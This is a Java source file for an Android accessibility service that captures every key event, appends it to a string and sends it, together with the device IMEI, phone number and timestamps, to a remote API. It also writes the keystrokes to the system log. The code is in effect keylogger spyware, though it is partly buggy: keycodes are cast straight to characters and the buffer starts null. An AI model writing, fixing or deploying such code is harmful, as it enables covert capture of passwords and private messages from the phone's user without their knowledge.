package com.example.keyboard_capture;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import com.example.keyboard_capture.api.retrofit.RestApiAdapter;
import com.example.keyboard_capture.model.Captura;
import com.example.keyboard_capture.model.Padre;
import com.example.keyboard_capture.utility.CapsuledCaptured;
import com.example.keyboard_capture.utility.GetSHA;
import com.example.keyboard_capture.utility.Utiles;

import java.sql.Time;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

@RequiresApi(api = Build.VERSION_CODES.O)
public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "CustomAccessibility";
    public static String resolveMain;
    private String payload;
    private String me;
    private String phone;

    //Objetos para acceder a los recursos del API
    private Captura captura;
    private CapsuledCaptured capsuledCaptured;

    //El resultado del request
    private String resolve;


    //Variables de prueba para obtener el imei fuera de la actividad principal
    //private String ssid = MainActivity.getContext().getPhoneNumber();
    //private String idPhone = ((MainActivity) getApplicationContext()).getPhoneNumber();
    //private String imei;
    //private Constants constants = new Constants();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //if (event.getEventType() == AccessibilityEvent.) {}
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        //handle keyevent for widnows key
            //Send broadcast intent to main activity.
            //On the main activity you can take any desired action.
            //KeyCharacterMap key = event.getKeyCharacterMap();
            int keycode = event.getKeyCode();
            char keyChar = (char) keycode;
            payload += keyChar;
            if(payload.length() == 100){
                payload = "";
                resolveMain =  requestCapture(payload, "app-1", "url-1");
            }
            //Log.d(TAG, "letra: " + payload);
            resolveMain =  requestCapture(payload, "app-1", "url-1");

            Log.i(TAG, "payload: " + payload + "-->imei-->" + getMe() + "-->phone-->" + getPhone());
            Log.i(TAG, "Resolve: " + resolveMain);

            //Log.v(TAG, "letra: " + payload);
        return super.onKeyEvent(event);
    }

    private String requestCapture(String payload, String appMoment, String urlImage){
        captura = new Captura(GetSHA.get_SHA_512_SecurePassword("owner_hash", getMe()),
                getMe(), "t", payload, urlImage,
                Utiles.obtenerFechaActual("America/Bogota"),
                Utiles.obtenerHoraActual("America/Bogota"), appMoment);

        capsuledCaptured = new CapsuledCaptured(captura);
        resolve = capsuledCaptured.callPostDataCapture();

        return resolve;
    }


    public String getPhone() {
        phone = MainActivity.phone;
        return phone;
    }

    public String getMe() {
        me = MainActivity.imei;
        return me;
    }

/*
    public void callPostNewFather(){
        RestApiAdapter restApiAdapter = new RestApiAdapter();

        //Hacer inyeccion de dependencias para reutilizar el mismo objeto y no saturar la memoria con una nuva instancia.
        //imei = constants.getIMEI();

        nuevoPadre = new Padre(getMe(), "padre:"+getMe()+getPhone(), getPhone(), "padren@gmail.com");

        restApiAdapter
                .getClientService()
                .createPadre(nuevoPadre)
                .enqueue(new Callback<Padre>() {
                    @Override
                    public void onResponse(Call<Padre> call, Response<Padre> response) {
                        Log.i(TAG,"request: " + response.body().toString() + "==> u_u");
                    }
                    @Override
                    public void onFailure(Call<Padre> call, Throwable t) {
                        Log.i(TAG,"request: Error :(");

                    }
                });
    }


    private void callPostGetUser() {
        RestApiAdapter restApiAdapter = new RestApiAdapter();
        restApiAdapter
                .getClientService()
                .postGetDataUser("12345AB")
                .enqueue(new Callback<List<UserTest>>() {
                    @Override
                    public void onResponse(Call<List<UserTest>> call, Response<List<UserTest>> response) {
                        Log.i(TAG,"post 1 => "+ response.body().size());
                    }
                    @Override
                    public void onFailure(Call<List<UserTest>> call, Throwable t) {
                    }
                });
    }

*/

}

